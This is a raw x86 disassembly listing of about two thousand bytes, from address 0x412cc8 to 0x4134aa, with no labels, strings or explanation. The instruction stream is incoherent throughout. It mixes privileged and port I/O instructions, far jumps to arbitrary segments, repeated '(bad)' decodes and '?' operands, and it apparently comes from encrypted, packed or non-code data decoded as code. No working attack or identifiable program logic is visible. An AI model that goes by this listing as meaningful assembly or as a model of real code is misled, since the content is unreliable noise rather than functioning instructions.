  412cc8:	or     ebx,DWORD PTR [ecx+eax*1]
  412ccb:	gs xchg ebp,eax
  412ccd:	lea    ebp,[ebx+0x395d0e5f]
  412cd3:	mov    bl,0xbd
  412cd5:	ret    0xe76b
  412cd8:	cmp    edi,DWORD PTR [ecx+0x5c]
  412cdb:	jmp    0x947119fa
  412ce0:	push   edx
  412ce1:	call   0x7c0d17c4
  412ce6:	rcr    ebp,1
  412ce8:	mov    al,0x24
  412cea:	adc    BYTE PTR [edx+eax*4-0x160f1bf3],ah
  412cf1:	adc    BYTE PTR [edx-0x7c],0x65
  412cf5:	clc    
  412cf6:	and    DWORD PTR [edi+0x5d],esi
  412cf9:	dec    esp
  412cfa:	outs   dx,BYTE PTR ds:[esi]
  412cfb:	mov    esp,0x401d7037
  412d00:	icebp  
  412d01:	mov    al,ds:0x1ea58f8d
  412d06:	ret    0xf10f
  412d09:	push   ss
  412d0a:	int    0xc4
  412d0c:	int3   
  412d0d:	or     edi,esp
  412d0f:	ds or  al,bl
  412d12:	data16 cld 
  412d14:	imul   esi,DWORD PTR [edi],0xfffffff7
  412d17:	pop    eax
  412d18:	dec    ecx
  412d19:	push   cs
  412d1a:	dec    ebx
  412d1b:	dec    edx
  412d1c:	or     al,0xe
  412d1e:	mov    ebx,0x2ac84208
  412d23:	and    BYTE PTR [ecx-0x7c1d8ac7],al
  412d29:	or     dl,ah
  412d2b:	pop    edx
  412d2c:	sar    eax,0xdd
  412d2f:	std    
  412d30:	lahf   
  412d31:	and    DWORD PTR [ebx-0x508457c8],ebx
  412d37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d38:	sub    ax,si
  412d3b:	sbb    ah,BYTE PTR [esi+0x3636ee64]
  412d41:	jne    0x412da7
  412d43:	sub    bl,BYTE PTR [ecx]
  412d45:	sbb    edx,DWORD PTR [ebp+0x45dbe5f5]
  412d4b:	stos   BYTE PTR es:[edi],al
  412d4c:	cmp    DWORD PTR [edx+eiz*2],ebx
  412d4f:	push   ss
  412d50:	fidiv  DWORD PTR [edx+0x73]
  412d53:	mov    dl,0x2d
  412d55:	push   ds
  412d56:	es jle 0x412d8d
  412d59:	push   eax
  412d5a:	icebp  
  412d5b:	out    dx,al
  412d5c:	or     BYTE PTR [edi],dl
  412d5e:	pop    ss
  412d5f:	pop    eax
  412d60:	div    esi
  412d62:	mov    edx,0x8a6515c4
  412d67:	xor    edi,DWORD PTR ds:0x81fb2df4
  412d6d:	adc    DWORD PTR [ebp-0x68],esi
  412d70:	cld    
  412d71:	out    0xab,al
  412d73:	inc    ebx
  412d74:	push   ds
  412d75:	stos   BYTE PTR es:[edi],al
  412d76:	jno    0x412d85
  412d78:	push   eax
  412d79:	gs clc 
  412d7b:	imul   ebp,ecx,0x7fe8348e
  412d81:	push   edx
  412d82:	jbe    0x412dfb
  412d84:	sbb    esp,DWORD PTR [edx-0x47eef575]
  412d8a:	int    0x32
  412d8c:	out    0xe2,eax
  412d8e:	add    eax,0x6fce0f0d
  412d93:	lea    esp,[eax]
  412d95:	jo     0x412db9
  412d97:	cs call 0x5b4f:0xd56371cd
  412d9f:	out    dx,eax
  412da0:	popa   
  412da1:	je     0x412ddb
  412da3:	pop    ecx
  412da4:	jae    0x412db1
  412da6:	and    al,0x96
  412da8:	pop    ecx
  412da9:	push   esp
  412daa:	cmp    DWORD PTR [edi+0x74768e52],esp
  412db0:	pop    ecx
  412db1:	sbb    DWORD PTR [ebp+esi*2-0x51],esi
  412db5:	push   ds
  412db6:	xchg   ebx,eax
  412db7:	scas   eax,DWORD PTR es:[edi]
  412db8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412db9:	call   0xb571c4c1
  412dbe:	fcmovnb st,st(6)
  412dc0:	dec    DWORD PTR [ebx+0x17138e05]
  412dc6:	(bad)  
  412dc7:	ficomp DWORD PTR [esi-0x14]
  412dca:	test   eax,0x9f9e037f
  412dcf:	sub    BYTE PTR [edx+0x134d8c8f],al
  412dd5:	mov    edx,0xd6d2b25e
  412dda:	adc    WORD PTR [eax+0x64],di
  412dde:	jmp    0xff6d:0x89e9f62a
  412de5:	ss mov ah,ah
  412de8:	jmp    0xfe86:0x837baa47
  412def:	cs shl bh,cl
  412df2:	je     0x412de5
  412df4:	dec    eax
  412df5:	dec    edx
  412df6:	adc    al,0xbb
  412df8:	loope  0x412df8
  412dfa:	(bad)  
  412dfb:	aad    0xf5
  412dfd:	stc    
  412dfe:	pop    eax
  412dff:	mov    ds:0x429f3dfc,al
  412e04:	xchg   edi,eax
  412e05:	lds    ecx,FWORD PTR ds:0xdfbfba39
  412e0b:	test   DWORD PTR [ebx+0x71ba3f2b],ebx
  412e11:	retf   0x910c
  412e14:	mov    ebp,0x5c229d63
  412e19:	xchg   edx,eax
  412e1a:	fs jg  0x412e12
  412e1d:	push   edi
  412e1e:	das    
  412e1f:	les    ecx,FWORD PTR [eax]
  412e21:	push   0xc6e9924e
  412e26:	scas   al,BYTE PTR es:[edi]
  412e27:	das    
  412e28:	(bad)  
  412e29:	cmp    ah,BYTE PTR [ebp-0x33]
  412e2c:	(bad)  [esi+0x79]
  412e2f:	fbstp  TBYTE PTR [edi-0x2fc82d87]
  412e35:	inc    ecx
  412e36:	and    DWORD PTR [edx-0x2e57775a],eax
  412e3c:	outs   dx,BYTE PTR ds:[esi]
  412e3d:	or     ecx,DWORD PTR [eax-0x4b]
  412e40:	jbe    0x412e66
  412e42:	jne    0x412e79
  412e44:	mov    DWORD PTR [ebx+0x2e5d8d37],esp
  412e4a:	call   0x7c18:0xba77178
  412e51:	addr16 jl 0x412dec
  412e54:	pop    eax
  412e55:	jb     0x412de0
  412e57:	and    DWORD PTR [edi+ebp*4+0x6b],eax
  412e5b:	and    eax,0x5ac191b4
  412e60:	cmp    edx,eax
  412e62:	fs out 0x51,eax
  412e65:	and    BYTE PTR [ebp-0x47f2c99b],bl
  412e6b:	jl     0x412e33
  412e6d:	push   ecx
  412e6e:	int3   
  412e6f:	add    DWORD PTR [ebx+eax*8],edx
  412e72:	inc    edi
  412e73:	push   edi
  412e74:	xchg   ecx,eax
  412e75:	loope  0x412ea6
  412e77:	arpl   cx,ax
  412e79:	(bad)  
  412e7a:	(bad)  
  412e7c:	hlt    
  412e7d:	jb     0x412e24
  412e7f:	xchg   edi,eax
  412e80:	jl     0x412e5b
  412e82:	test   BYTE PTR [ecx+0x5a94b1a8],cl
  412e88:	jno    0x412e23
  412e8a:	or     edx,esi
  412e8c:	lods   eax,DWORD PTR ds:[esi]
  412e8d:	clc    
  412e8e:	in     al,dx
  412e8f:	jno    0x412e43
  412e91:	mov    ebx,0x9e56080a
  412e96:	jecxz  0x412ece
  412e98:	pop    esp
  412e99:	in     eax,dx
  412e9a:	or     edx,DWORD PTR [ebx-0x5b45fd7f]
  412ea0:	xor    al,0xe7
  412ea2:	cmp    edx,DWORD PTR [ecx-0x1]
  412ea5:	loope  0x412e30
  412ea7:	popa   
  412ea8:	cmp    DWORD PTR [ebp+0x2a377ce8],0x84cbdbc6
  412eb2:	mov    ds,WORD PTR [ebp+0x74]
  412eb5:	aam    0x29
  412eb7:	mov    esi,0xe3c5491f
  412ebc:	xchg   edx,eax
  412ebd:	stos   DWORD PTR es:[edi],eax
  412ebe:	push   0x4f
  412ec0:	test   BYTE PTR [esi+0x1b],ah
  412ec3:	xchg   DWORD PTR [ebx+0x7904b874],edx
  412ec9:	jo     0x412f1e
  412ecb:	daa    
  412ecc:	pushf  
  412ecd:	ror    BYTE PTR [ebx+0x6f],0xd
  412ed1:	into   
  412ed2:	xor    al,0x24
  412ed4:	fcomp  DWORD PTR [ecx]
  412ed6:	dec    esp
  412ed7:	adc    BYTE PTR [ebx],al
  412ed9:	mov    edi,0x1472e913
  412ede:	iret   
  412edf:	jns    0x412f2a
  412ee1:	sub    DWORD PTR [eax-0x14852fd2],0xf324c233
  412eeb:	retf   0x8bcb
  412eee:	mov    ah,0x5c
  412ef0:	and    DWORD PTR [eax-0x846752b],ebp
  412ef6:	xor    DWORD PTR [ecx-0x67],esi
  412ef9:	push   esp
  412efa:	repnz rcr DWORD PTR ds:0x5f2165ae,1
  412f01:	es pop ss
  412f03:	or     DWORD PTR [ecx-0x6e],esp
  412f06:	in     al,dx
  412f07:	push   0x72
  412f09:	fs int3 
  412f0b:	mov    ebp,0x49e2db53
  412f10:	shr    ah,0xf1
  412f13:	sbb    al,0x94
  412f15:	mov    ds:0x732c7aeb,eax
  412f1a:	xlat   BYTE PTR ds:[ebx]
  412f1b:	push   0xffffffb7
  412f1d:	add    DWORD PTR [eax],0xffffff93
  412f20:	mov    ch,0x5e
  412f22:	dec    edx
  412f23:	mov    ds:0x6821d9ad,eax
  412f28:	pop    edi
  412f29:	add    cl,BYTE PTR [ebp-0x3b]
  412f2c:	adc    ecx,DWORD PTR [ecx-0x1c]
  412f2f:	adc    bl,BYTE PTR [edx+0x785bbb42]
  412f35:	pop    ss
  412f36:	retf   0xd45d
  412f39:	icebp  
  412f3a:	out    dx,eax
  412f3b:	add    al,0x45
  412f3d:	ret    0x632c
  412f40:	mov    eax,0x4243bcb1
  412f45:	jns    0x412f6e
  412f47:	sbb    eax,0xbf788763
  412f4c:	and    dh,al
  412f4e:	inc    edi
  412f4f:	push   0x534aff6d
  412f54:	imul   eax,DWORD PTR [edx],0xfffffff8
  412f57:	retf   
  412f58:	dec    ebp
  412f59:	dec    eax
  412f5a:	inc    esp
  412f5b:	scas   al,BYTE PTR es:[edi]
  412f5c:	push   edx
  412f5d:	push   es
  412f5e:	ret    0xffe6
  412f61:	push   0x20abf91f
  412f66:	jns    0x412f13
  412f68:	loope  0x412f82
  412f6a:	(bad)  
  412f6b:	xchg   ebp,eax
  412f6c:	bound  esp,QWORD PTR [ecx-0x40c33337]
  412f72:	xor    eax,0x42c08f5e
  412f77:	inc    esi
  412f78:	cdq    
  412f79:	add    eax,0x573b2a47
  412f7e:	arpl   WORD PTR [edx+0x6f],cx
  412f81:	and    al,0x43
  412f83:	inc    esi
  412f84:	and    al,0x3c
  412f86:	aam    0x92
  412f88:	adc    BYTE PTR ds:0xddb9b21b,0x8c
  412f8f:	xchg   ebx,eax
  412f90:	pushf  
  412f91:	mov    BYTE PTR [eax+eax*1-0x7f91e89d],bh
  412f98:	xor    ebx,DWORD PTR ds:0x1680e376
  412f9e:	fist   WORD PTR ds:0x122421c5
  412fa4:	stos   BYTE PTR es:[edi],al
  412fa5:	push   ecx
  412fa6:	ins    DWORD PTR es:[edi],dx
  412fa7:	mov    ebp,0xe08c466f
  412fac:	xchg   ebp,eax
  412fad:	scas   al,BYTE PTR es:[edi]
  412fae:	pop    es
  412faf:	outs   dx,BYTE PTR ds:[esi]
  412fb0:	adc    al,0x8b
  412fb2:	pop    ss
  412fb3:	lods   al,BYTE PTR ds:[esi]
  412fb4:	jns    0x412fc9
  412fb6:	stc    
  412fb7:	inc    ebx
  412fb8:	leave  
  412fb9:	xlat   BYTE PTR fs:[ebx]
  412fbb:	mov    cl,BYTE PTR [ebp-0x61]
  412fbe:	sbb    esp,DWORD PTR [eax-0x476cdbda]
  412fc4:	push   ss
  412fc5:	or     BYTE PTR [ecx+esi*2+0x3cbf97d5],bl
  412fcc:	and    DWORD PTR [eax+0x424739b7],ebx
  412fd2:	inc    edx
  412fd3:	sbb    eax,0x4091c287
  412fd8:	mov    BYTE PTR [ebp+0x4b],bl
  412fdb:	jmp    0x16be8a4e
  412fe0:	adc    DWORD PTR [esi+0x6],ecx
  412fe3:	call   0xca85cdaf
  412fe8:	pop    ss
  412fe9:	mov    es,WORD PTR [ecx-0x4]
  412fec:	outs   dx,BYTE PTR ds:[esi]
  412fed:	mov    edi,0x701f3f05
  412ff2:	sbb    BYTE PTR [eax+0x23cab4f3],cl
  412ff8:	es or  eax,0x42ba8174
  412ffe:	out    dx,al
  412fff:	fimul  DWORD PTR [ebp+0x4769ff60]
  413005:	xor    edx,esp
  413007:	into   
  413008:	std    
  413009:	and    cl,BYTE PTR [ebp-0x68c7a662]
  41300f:	or     al,0x5a
  413011:	call   0xbf942579
  413016:	js     0x413020
  413018:	mov    ss,ecx
  41301a:	cdq    
  41301b:	adc    ecx,edi
  41301d:	push   edi
  41301e:	dec    ebp
  41301f:	push   cs
  413020:	and    ecx,DWORD PTR [edx-0x69]
  413023:	sbb    ebp,DWORD PTR [edi]
  413025:	sub    eax,0x4de74cd9
  41302a:	outs   dx,BYTE PTR ds:[esi]
  41302b:	push   ecx
  41302c:	pushf  
  41302d:	call   0xc65b21fd
  413032:	push   ecx
  413033:	and    esi,DWORD PTR [ecx+ebx*4]
  413036:	cmp    eax,ebx
  413038:	jnp    0x413022
  41303a:	clc    
  41303b:	pop    ecx
  41303c:	out    0xc3,eax
  41303e:	scas   eax,DWORD PTR es:[edi]
  41303f:	test   eax,0x865768f5
  413044:	ds mov ecx,0x9a067694
  41304a:	arpl   WORD PTR [ebx],bx
  41304c:	ror    BYTE PTR [edx+ebx*2],1
  41304f:	ja     0x4130b1
  413051:	loop   0x413093
  413053:	mov    ch,0x23
  413055:	out    dx,eax
  413056:	jbe    0x41307d
  413058:	test   BYTE PTR [ecx],ch
  41305a:	outs   dx,BYTE PTR ds:[esi]
  41305b:	aas    
  41305c:	xchg   esi,eax
  41305d:	pop    ebp
  41305e:	cmp    dl,BYTE PTR [ebx+edi*2]
  413061:	add    esp,DWORD PTR [esp+ebx*4-0x4e]
  413065:	loope  0x4130e6
  413067:	xor    ah,BYTE PTR ds:0xf118fa6
  41306d:	pop    es
  41306e:	bound  ebp,QWORD PTR [ebx+0xac6a26a]
  413074:	jg     0x413094
  413076:	add    esi,ecx
  413078:	ins    DWORD PTR es:[edi],dx
  413079:	push   esp
  41307a:	and    al,0xcb
  41307c:	push   edi
  41307d:	pop    ecx
  41307e:	push   cs
  41307f:	jb     0x413090
  413081:	inc    ebp
  413082:	dec    bl
  413084:	imul   edi,DWORD PTR [edi-0x7f],0x1b
  413088:	cmp    ecx,edx
  41308a:	je     0x4130eb
  41308c:	dec    edi
  41308d:	mov    al,ds:0x42a427e1
  413092:	add    al,0xf
  413094:	daa    
  413095:	sbb    BYTE PTR [ebx-0x13],0x4f
  413099:	(bad)  
  41309a:	cmp    DWORD PTR [edx+0x39],ebx
  41309d:	sbb    eax,0xc857ac5
  4130a2:	nop
  4130a3:	ret    
  4130a4:	out    0xed,eax
  4130a6:	out    0xc7,eax
  4130a8:	push   ebp
  4130a9:	xlat   BYTE PTR ds:[ebx]
  4130aa:	xchg   edx,eax
  4130ab:	mov    ebp,0x4bb8aea9
  4130b0:	ret    0x8d26
  4130b3:	inc    ebx
  4130b4:	adc    al,0xc6
  4130b6:	push   esp
  4130b7:	sbb    al,0xe2
  4130b9:	xchg   BYTE PTR [edi*4+0x66ec981d],cl
  4130c0:	dec    esi
  4130c1:	arpl   cx,si
  4130c3:	or     BYTE PTR [eax+0x15],cl
  4130c6:	out    dx,eax
  4130c7:	pop    ebx
  4130c8:	push   0xff5f3999
  4130cd:	push   edi
  4130ce:	lods   eax,DWORD PTR ds:[esi]
  4130cf:	mov    esi,0x47bf008
  4130d4:	fwait
  4130d5:	push   esi
  4130d6:	inc    ecx
  4130d7:	retf   
  4130d8:	sub    DWORD PTR [edx-0x1b],edx
  4130db:	mov    ax,0x7fe7
  4130df:	push   esp
  4130e0:	jb     0x4130d3
  4130e2:	mov    dl,0x1b
  4130e4:	call   0x435a:0xc75b042c
  4130eb:	not    BYTE PTR [ecx]
  4130ed:	and    al,0x75
  4130ef:	jl     0x41315c
  4130f1:	mov    ebp,0xd2c176af
  4130f6:	jl     0x413165
  4130f8:	sbb    eax,DWORD PTR [ebp+0x513cd2bb]
  4130fe:	fimul  WORD PTR [ecx-0x9]
  413101:	loop   0x413130
  413103:	mov    ch,0x24
  413105:	call   0x86b2d646
  41310a:	pop    eax
  41310b:	das    
  41310c:	sbb    eax,0x1c3ac3ec
  413111:	add    DWORD PTR [edx-0xfa991f2],edi
  413117:	pop    ds
  413118:	sub    al,0xc4
  41311a:	loope  0x413196
  41311c:	leave  
  41311d:	mov    ds:0x6f1fb19d,eax
  413122:	scas   al,BYTE PTR es:[edi]
  413123:	mov    bl,0xdf
  413125:	in     al,0x1b
  413127:	je     0x4131a2
  413129:	loopne 0x41312e
  41312b:	fs pop esp
  41312d:	mov    BYTE PTR [ebx-0x43d13f2e],ch
  413133:	into   
  413134:	add    bh,ah
  413136:	(bad)  
  413137:	lea    edi,[eax]
  413139:	ret    0x7cb
  41313c:	cmp    ebx,DWORD PTR [ebx]
  41313e:	out    0xd4,eax
  413140:	enter  0x85b3,0xc7
  413144:	daa    
  413145:	cmp    edx,0x6
  413148:	adc    al,0x8a
  41314a:	cs neg ebp
  41314d:	sub    dl,ch
  41314f:	out    dx,al
  413150:	xchg   ebx,eax
  413151:	ror    ah,1
  413153:	enter  0x28e6,0xae
  413157:	push   edx
  413158:	jo     0x4131b7
  41315a:	shl    BYTE PTR [ecx+0x55],0xea
  41315e:	hlt    
  41315f:	in     al,dx
  413160:	jecxz  0x41318f
  413162:	sti    
  413163:	jl     0x4131c4
  413165:	xor    eax,ecx
  413167:	inc    ebp
  413168:	je     0x4130f6
  41316a:	je     0x4131bd
  41316c:	push   ebp
  41316d:	inc    eax
  41316e:	pushf  
  41316f:	cmp    al,0x49
  413171:	push   ds
  413172:	or     al,0xc6
  413174:	xor    eax,0x43449427
  413179:	lods   al,BYTE PTR ds:[esi]
  41317a:	aaa    
  41317b:	jns    0x41310e
  41317d:	jae    0x413150
  41317f:	stc    
  413180:	add    dl,ch
  413182:	int    0x22
  413184:	dec    esi
  413185:	sbb    BYTE PTR [edx],ch
  413187:	rcl    BYTE PTR [ecx-0x47332809],0x6e
  41318e:	test   ebp,0xf83e46b9
  413194:	lea    eax,[esi-0x4e]
  413197:	fldenv [esi+edx*2+0x7a7783a5]
  41319e:	sti    
  41319f:	fsubp  st(0),st
  4131a1:	bound  esi,QWORD PTR [ebp+0x56]
  4131a4:	(bad)  
  4131a5:	scas   eax,DWORD PTR es:[edi]
  4131a6:	jno    0x413226
  4131a8:	(bad)  
  4131aa:	inc    esp
  4131ab:	loope  0x41313b
  4131ad:	fs and eax,0xcb151a65
  4131b3:	in     al,dx
  4131b4:	sti    
  4131b5:	call   0xa25a:0x67f83a86
  4131bc:	xor    al,0xf8
  4131be:	inc    ebx
  4131bf:	mov    dl,0x3f
  4131c1:	enter  0x7d1d,0x4d
  4131c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131c6:	sahf   
  4131c7:	popa   
  4131c8:	in     eax,0x5d
  4131ca:	push   edx
  4131cb:	or     DWORD PTR [eax],ebp
  4131cd:	or     DWORD PTR [ebp+0xf3fed79],ecx
  4131d3:	je     0x4131fa
  4131d5:	shr    dl,0x51
  4131d8:	inc    eax
  4131d9:	js     0x41324b
  4131db:	ja     0x4131fc
  4131dd:	or     eax,0x45334f19
  4131e2:	adc    esp,DWORD PTR ds:0xe7cf76c6
  4131e8:	or     cl,BYTE PTR [esi+0xc43a493]
  4131ee:	ins    DWORD PTR es:[edi],dx
  4131ef:	paddusw mm0,mm0
  4131f2:	mov    cl,0x71
  4131f4:	pop    ebx
  4131f5:	mov    edx,0x1e0588b4
  4131fa:	jmp    0x4131e5
  4131fc:	jmp    0x413245
  4131fe:	(bad)  [ebx+0x2ffa87b7]
  413204:	ins    DWORD PTR es:[edi],dx
  413205:	jge    0x413228
  413207:	dec    esp
  413208:	arpl   WORD PTR [ebx-0x77dc5b87],si
  41320e:	jnp    0x413254
  413210:	dec    esp
  413211:	add    eax,0x29ea73cd
  413216:	jmp    0xd1eb097f
  41321b:	aas    
  41321c:	push   0x3f
  41321e:	or     eax,0x9bf080fe
  413223:	cs jo  0x4131bc
  413226:	mov    ds:0xd9d59d7e,al
  41322b:	fisubr WORD PTR [edi+0x7810f716]
  413231:	inc    esp
  413232:	xchg   edi,eax
  413233:	mov    esi,0xc96b65d0
  413238:	xor    BYTE PTR [ebp+0x64],cl
  41323b:	xchg   ebp,esi
  41323d:	xor    eax,0x8ec4dc5
  413242:	sahf   
  413243:	or     al,BYTE PTR [ecx+ecx*8+0x18]
  413247:	jge    0x4131de
  413249:	adc    eax,0x952f7765
  41324e:	sti    
  41324f:	cmc    
  413250:	cdq    
  413251:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413252:	mov    dl,0x80
  413254:	add    al,0x7e
  413256:	mov    bl,0x1f
  413258:	push   edx
  413259:	push   edi
  41325a:	scas   eax,DWORD PTR es:[edi]
  41325b:	(bad)  
  41325c:	test   eax,0x881ad1ae
  413261:	(bad)  
  413262:	aas    
  413263:	sti    
  413264:	xchg   ebx,eax
  413265:	mov    edx,0x28fac39a
  41326a:	jmp    0x6526:0xab23b34d
  413271:	(bad)  
  413272:	repz jg 0x41322a
  413275:	pusha  
  413276:	adc    eax,0x8feb6197
  41327b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41327c:	mov    ds:0xc78b6216,eax
  413281:	mov    edx,cr2
  413284:	fild   QWORD PTR [esp+ebx*8-0x48e314f7]
  41328b:	(bad)  
  41328c:	xlat   BYTE PTR ds:[ebx]
  41328d:	jg     0x4132b4
  41328f:	sbb    DWORD PTR [ebp+0x5c6fe2ef],0xfffffff6
  413296:	ins    BYTE PTR es:[edi],dx
  413297:	sbb    eax,0x9b6f6fcc
  41329c:	pop    ds
  41329d:	cmp    BYTE PTR [ebx+0x6d],0xf5
  4132a1:	push   0xf0878a85
  4132a6:	xchg   edx,eax
  4132a7:	adc    BYTE PTR [esi],dl
  4132a9:	ds mul esi
  4132ac:	stos   DWORD PTR es:[edi],eax
  4132ad:	retf   
  4132ae:	dec    esi
  4132af:	inc    ecx
  4132b0:	adc    BYTE PTR [ebp+0x5a],cl
  4132b3:	cmc    
  4132b4:	outs   dx,DWORD PTR ds:[esi]
  4132b5:	out    0x31,eax
  4132b7:	ficomp DWORD PTR ds:0x8cceefbe
  4132bd:	or     eax,0x4e5bf3a2
  4132c2:	or     BYTE PTR ds:0xcb56fa8b,ch
  4132c8:	test   BYTE PTR [edx+0x68],bh
  4132cb:	and    eax,0xf98944c0
  4132d0:	add    al,bh
  4132d2:	stos   BYTE PTR es:[edi],al
  4132d3:	inc    ebx
  4132d4:	inc    eax
  4132d5:	push   eax
  4132d6:	sbb    al,0x34
  4132d8:	fdivr  QWORD PTR [edi+0x6e]
  4132db:	aad    0x3e
  4132dd:	fnsave [eax]
  4132df:	sar    cl,1
  4132e1:	jecxz  0x413294
  4132e3:	ja     0x41334a
  4132e5:	jg     0x41330d
  4132e7:	nop
  4132e8:	fidiv  DWORD PTR [eax]
  4132ea:	mov    ?,WORD PTR [ebx]
  4132ec:	pop    ss
  4132ed:	(bad)  
  4132ee:	jmp    FWORD PTR [ecx]
  4132f0:	repnz inc edi
  4132f2:	cli    
  4132f3:	push   ebp
  4132f4:	dec    ebp
  4132f5:	inc    esi
  4132f6:	les    esp,FWORD PTR [ecx-0x28]
  4132f9:	dec    ecx
  4132fa:	leave  
  4132fb:	dec    ebp
  4132fd:	mov    WORD PTR [edi-0x6e],?
  413300:	xchg   ebp,eax
  413301:	pop    esp
  413302:	jnp    0x41333e
  413304:	lods   eax,DWORD PTR ds:[esi]
  413305:	enter  0x222d,0x1
  413309:	daa    
  41330a:	arpl   ax,bp
  41330c:	lods   eax,DWORD PTR ds:[esi]
  41330d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41330e:	test   eax,0xbe1ebff3
  413313:	inc    eax
  413314:	cmp    dh,cl
  413316:	aas    
  413317:	daa    
  413318:	dec    ecx
  413319:	(bad)  
  41331b:	mov    db1,eax
  41331e:	outs   dx,DWORD PTR ds:[esi]
  41331f:	mov    ebp,0x592f847d
  413324:	scas   al,BYTE PTR es:[edi]
  413325:	jbe    0x4132c9
  413327:	push   0xffffffa0
  413329:	(bad)  
  41332a:	retf   0xf7a7
  41332d:	pop    edx
  41332e:	xlat   BYTE PTR ds:[ebx]
  41332f:	jmp    0x5d9095e5
  413334:	inc    eax
  413335:	cvttps2pi mm7,xmm2
  413338:	stos   BYTE PTR es:[edi],al
  413339:	jp     0x4133a2
  41333b:	ins    DWORD PTR es:[edi],dx
  41333c:	jo     0x4132d7
  41333e:	jmp    0x41337f
  413340:	sbb    BYTE PTR [eax-0x72718387],0x1a
  413347:	bound  esp,QWORD PTR [eax]
  413349:	aad    0xf0
  41334b:	aaa    
  41334c:	pop    ss
  41334d:	loope  0x4132e7
  41334f:	in     eax,dx
  413350:	add    BYTE PTR [ecx+ebx*1-0x3db4e60c],bl
  413357:	pop    edx
  413358:	out    dx,eax
  413359:	sbb    bh,BYTE PTR [edx]
  41335b:	loopne 0x41339b
  41335d:	jecxz  0x4133c7
  41335f:	jmp    0x8a622dff
  413364:	add    DWORD PTR [ebp+0x1d],edx
  413367:	sbb    eax,0xeb9faecf
  41336c:	call   0xb06446ff
  413371:	clc    
  413372:	(bad)  
  413373:	sbb    eax,0xe52bd6a9
  413378:	and    DWORD PTR [esi],esp
  41337a:	cs shr edx,0xf4
  41337e:	sbb    al,0x53
  413380:	lods   al,BYTE PTR ds:[esi]
  413381:	cwde   
  413382:	xor    BYTE PTR [esi-0x33cb2b89],ah
  413388:	bound  eax,QWORD PTR [ebx+0x34dba06b]
  41338e:	pop    ecx
  41338f:	ins    DWORD PTR es:[edi],dx
  413390:	inc    esp
  413391:	(bad)  
  413392:	in     al,dx
  413393:	gs mov ebp,0x1422b8ce
  413399:	jecxz  0x4133df
  41339b:	sub    eax,0x64eb2225
  4133a0:	scas   eax,DWORD PTR es:[edi]
  4133a1:	add    BYTE PTR [eax],al
  4133a3:	mov    BYTE PTR [esp+ebx*4-0x28],bl
  4133a7:	ds mov al,0x9c
  4133aa:	jg     0x4133df
  4133ac:	aad    0x42
  4133ae:	cmp    bl,BYTE PTR [ebx]
  4133b0:	push   es
  4133b1:	mov    ecx,0xc33354b1
  4133b6:	jo     0x4133d8
  4133b8:	repz das 
  4133ba:	jmp    0x7858:0x68223284
  4133c1:	push   cs
  4133c2:	jl     0x41336e
  4133c4:	mov    eax,0x18375665
  4133c9:	push   ebx
  4133ca:	icebp  
  4133cb:	mov    cl,0xbf
  4133cd:	dec    ebx
  4133ce:	stc    
  4133cf:	fsub   DWORD PTR [edx+0x3abadd9b]
  4133d5:	dec    esp
  4133d6:	push   0x40f583cf
  4133db:	inc    edi
  4133dc:	adc    DWORD PTR [edi+0x6d0269ee],edx
  4133e2:	dec    edx
  4133e3:	push   ebp
  4133e4:	xor    ah,BYTE PTR [ecx-0x2ea385cc]
  4133ea:	inc    ebx
  4133eb:	push   esp
  4133ec:	mov    fs,WORD PTR [ebx]
  4133ee:	pop    eax
  4133ef:	stc    
  4133f0:	call   0x7358ff74
  4133f5:	sub    edx,ebx
  4133f7:	lods   eax,DWORD PTR ds:[esi]
  4133f8:	stos   DWORD PTR es:[edi],eax
  4133f9:	sub    al,0x2d
  4133fb:	push   eax
  4133fc:	adc    DWORD PTR [eax],ebp
  4133fe:	lahf   
  4133ff:	sbb    al,0x4
  413401:	mov    BYTE PTR [ebx-0x2e3bd644],ch
  413407:	inc    esp
  413408:	jecxz  0x413401
  41340a:	lods   eax,DWORD PTR ds:[esi]
  41340b:	mov    ebp,0x7e092d92
  413410:	mov    ah,0x6b
  413412:	pop    ss
  413413:	jp     0x4133d4
  413415:	cwde   
  413416:	pop    ecx
  413417:	ins    BYTE PTR es:[edi],dx
  413418:	test   BYTE PTR [ebx-0x15],cl
  41341b:	fs pop eax
  41341d:	retf   
  41341e:	adc    BYTE PTR [esp+edx*4+0x19],dl
  413422:	xlat   BYTE PTR ds:[ebx]
  413423:	into   
  413424:	push   ebx
  413425:	fcom   QWORD PTR [edi]
  413427:	and    DWORD PTR [edx-0x6001b2ae],esp
  41342d:	pop    ebx
  41342e:	lock in al,dx
  413430:	fdiv   QWORD PTR [ebx+0x2e3846d7]
  413436:	test   BYTE PTR [edx],ch
  413438:	mov    fs,esi
  41343a:	sbb    BYTE PTR [edi-0xe4960e0],cl
  413440:	out    0xeb,al
  413442:	dec    esi
  413443:	adc    al,0xfb
  413445:	clc    
  413446:	cmp    al,cl
  413448:	sbb    DWORD PTR [ecx+0x1a137bcf],esi
  41344e:	xchg   al,cl
  413450:	push   ds
  413451:	xor    ch,bh
  413453:	mov    edx,0x5258e952
  413458:	dec    eax
  413459:	stos   BYTE PTR es:[edi],al
  41345a:	push   ds
  41345b:	in     eax,dx
  41345c:	mov    bl,BYTE PTR [ebx-0x3c]
  41345f:	lea    esi,[esi]
  413461:	ret    0x9bb2
  413464:	out    dx,al
  413465:	sar    DWORD PTR [edx-0xd62f428],1
  41346b:	cld    
  41346c:	pushf  
  41346d:	imul   DWORD PTR [ecx]
  41346f:	push   eax
  413470:	mov    ds:0xaba81605,al
  413475:	push   eax
  413476:	scas   al,BYTE PTR es:[edi]
  413477:	inc    edi
  413478:	imul   ebx,ecx,0x61
  41347b:	jne    0x413496
  41347d:	xchg   edi,eax
  41347e:	aas    
  41347f:	mov    ecx,0x64c486cb
  413484:	jge    0x413455
  413486:	sub    esp,DWORD PTR [edi+0x6dcfda97]
  41348c:	and    ah,al
  41348e:	lods   al,BYTE PTR ds:[esi]
  41348f:	or     DWORD PTR [edx],esi
  413491:	and    eax,0xc8bce0fb
  413496:	inc    edx
  413497:	push   eax
  413498:	and    DWORD PTR [ebp+0x69cb5884],eax
  41349e:	add    BYTE PTR [ebp-0x7e],0xa4
  4134a2:	cli    
  4134a3:	mov    al,ds:0x3a4dfe69
  4134a8:	cmp    edx,esp
  4134aa:	pandn  mm7,mm2
